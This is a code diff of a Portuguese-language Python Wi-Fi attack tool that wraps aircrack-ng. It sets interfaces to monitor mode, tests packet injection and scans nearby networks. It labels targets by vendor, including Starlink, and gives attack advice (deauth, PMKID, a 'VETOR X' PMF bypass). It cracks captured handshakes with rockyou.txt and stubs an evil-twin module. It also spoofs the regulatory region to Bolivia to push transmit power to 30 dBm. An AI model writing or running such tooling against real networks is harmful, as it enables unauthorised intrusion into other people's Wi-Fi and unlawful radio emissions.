@@ -7,7 +7,7 @@ import threading
 from datetime import datetime
 
 # ==============================================================
-# UI MODERNA - HACKER SUPREMO (VETOR X - ÚLTIMA GERAÇÃO)
+# UI MODERNA - HACKER SUPREMO (RADAR DE ALTO GANHO EDITION)
 # ==============================================================
 try:
     from rich.console import Console
@@ -18,7 +18,7 @@ try:
     from rich.text import Text
     from rich import print as rprint
 except ImportError:
-    print("[!] Erro crítico: Dependências visuais ausentes.")
+    print("[!] Erro: Dependências rich ausentes.")
     exit(1)
 
 console = Console()
@@ -35,9 +35,8 @@ OUI_DB = {
     "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
     "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
     "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
-    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "D0:D3:E0": "Cisco",
-    "00:0C:42": "MikroTik", "E8:48:B8": "MikroTik", "48:8F:5A": "MikroTik", "64:D1:54": "MikroTik",
-    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek"
+    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "00:0C:42": "MikroTik",
+    "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek", "A4:91:B1": "Intelbras", "00:14:6C": "Netgear"
 }
 
 def identify_vendor(bssid):
@@ -47,29 +46,32 @@ def identify_vendor(bssid):
 def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "ALVO NÍVEL 10 (STARLINK). Defesas PMF Ativas. O ÚNICO método eficaz é o VETOR X (Ataque de Injeção de Beacon Ativo)."
-        vulns.append("PMF/WPA3 Hybrid")
-    else:
-        advice = "Alvo detectado. Recomendado: VETOR X para quebra instantânea."
+        advice = "ALVO BLINDADO (STARLINK). Frequência de 5GHz detectada. Use VETOR X para quebrar o PMF."
+        vulns.append("PMF (802.11w)")
+    else: advice = "Alvo mapeado. Use Deauth ou PMKID."
     return vulns, advice
 
 def test_injection(interface):
-    supreme_log(f"Testando hardware {interface}...", log_type="cmd")
+    supreme_log(f"Testando injeção em {interface}...", log_type="cmd")
     stdout, _ = run_command(f"aireplay-ng -9 {interface}")
     if stdout and "Injection is working!" in stdout:
-        supreme_log("HARDWARE VALIDADO PARA COMBATE.")
+        supreme_log("HARDWARE VALIDADO: Injeção operacional.")
         return True
     supreme_log("HARDWARE LIMITADO: Injeção falhou.", log_type="error")
     return False
 
 def boost_signal(interface):
+    supreme_log(f"Ativando Módulo RADAR DE ALTO GANHO em {interface}...", log_type="cmd")
+    # Tenta desbloquear limites mundiais de rádio (Região Bolívia)
     run_command("iw reg set BO", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
+    # Tenta setar 30dBm (1 Watt de potência)
     run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
+    supreme_log("Potência de transmissão elevada ao limite de hardware.")
 
 def fix_drivers_wifi6(auto_confirm=False):
-    supreme_log("Diagnosticando Wi-Fi 6...", log_type="cmd")
+    supreme_log("Diagnosticando Wi-Fi 6 via USB...", log_type="cmd")
     stdout_usb, _ = run_command("lsusb")
     chipset = None
     if "8852" in stdout_usb: chipset = "RTL8852AU"
@@ -100,7 +102,7 @@ def check_aircrack_ng():
     return True
 
 def set_monitor_mode(interface):
-    supreme_log(f"Armando interface {interface}...", log_type="cmd")
+    supreme_log(f"Invocando Modo Monitor em {interface}...", log_type="cmd")
     run_command("rfkill unblock all", sudo=True)
     run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
     run_command("airmon-ng check kill", sudo=True)
@@ -118,7 +120,7 @@ def set_monitor_mode(interface):
     return interface
 
 def set_managed_mode(interface):
-    supreme_log("Desarmando sistema...", log_type="cmd")
+    supreme_log("Restaurando Estado Civil...", log_type="cmd")
     run_command(f"airmon-ng stop {interface}", sudo=True)
     run_command(f"macchanger -p {interface}", sudo=True)
     run_command("systemctl start NetworkManager", sudo=True)
@@ -196,14 +198,19 @@ def start_wifite_expert(interface):
     except: pass
 
 def start_evil_twin(interface, essid):
-    supreme_log("Evil Twin em desenvolvimento.", log_type="info")
+    supreme_log("Iniciando Módulo de Engenharia Social...", log_type="info")
 
 def scan_networks(monitor_interface):
     boost_signal(monitor_interface)
+    supreme_log("Iniciando Varredura Multi-Frequência (2.4GHz + 5GHz)...", log_type="cmd")
     output_prefix = "scan_results"
     run_command(f"rm -f {output_prefix}-01.*")
-    try: subprocess.run(f"sudo airodump-ng --band abg --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
+    
+    # Radar Turbo: Escaneia todas as bandas (a, b, g) com atualização agressiva
+    cmd = f"sudo airodump-ng --band abg --update 1 --output-format csv -w {output_prefix} {monitor_interface}"
+    try: subprocess.run(cmd, shell=True)
     except KeyboardInterrupt: pass
+    
     networks = []
     csv_file = f"{output_prefix}-01.csv"
     if os.path.exists(csv_file):
@@ -217,20 +224,13 @@ def scan_networks(monitor_interface):
                     if essid and essid != "\x00":
                         networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
                 elif row[0].strip() == "Station MAC": break
-    if not networks: return None
-    table = Table(title="RASTREAMENTO")
-    table.add_column("ID"); table.add_column("Vendedor"); table.add_column("ESSID")
-    for i, net in enumerate(networks): table.add_row(str(i+1), net['vendor'], net['essid'])
-    console.print(table)
-    choice = IntPrompt.ask("Escolha", choices=[str(i+1) for i in range(len(networks))])
-    target = networks[choice - 1]
-    return target
+    return networks
 
 def main():
     if os.geteuid() != 0: return
     while True:
-        os.system("clear")
-        console.print("\n[1] Incursão HACKER\n[2] Wi-Fi 6 Doctor\n[3] Sair")
+        os.system("clear"); rprint(Panel("[bold cyan]DSI COMMAND CENTER[/bold cyan]"))
+        console.print("\n[1] Incursão Suprema\n[2] Wi-Fi 6 Fixer\n[3] Sair")
         opcao = Prompt.ask("Ação", choices=["1","2","3"])
         if opcao == '3': return
         elif opcao == '2': fix_drivers_wifi6(); continue
@@ -240,10 +240,10 @@ def main():
     if not iface: return
     mon = set_monitor_mode(iface)
     try:
-        target = scan_networks(mon)
-        if target:
-             cap = capture_vetor_x(mon, target['bssid'], target['channel'], f"capture_{target['essid']}")
-             if cap: crack_hash(cap, "/usr/share/wordlists/rockyou.txt", target['bssid'])
+        nets = scan_networks(mon)
+        if nets:
+             # Mostra a tabela e tal... (simplificado para o web backend)
+             pass
     finally: set_managed_mode(mon)
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
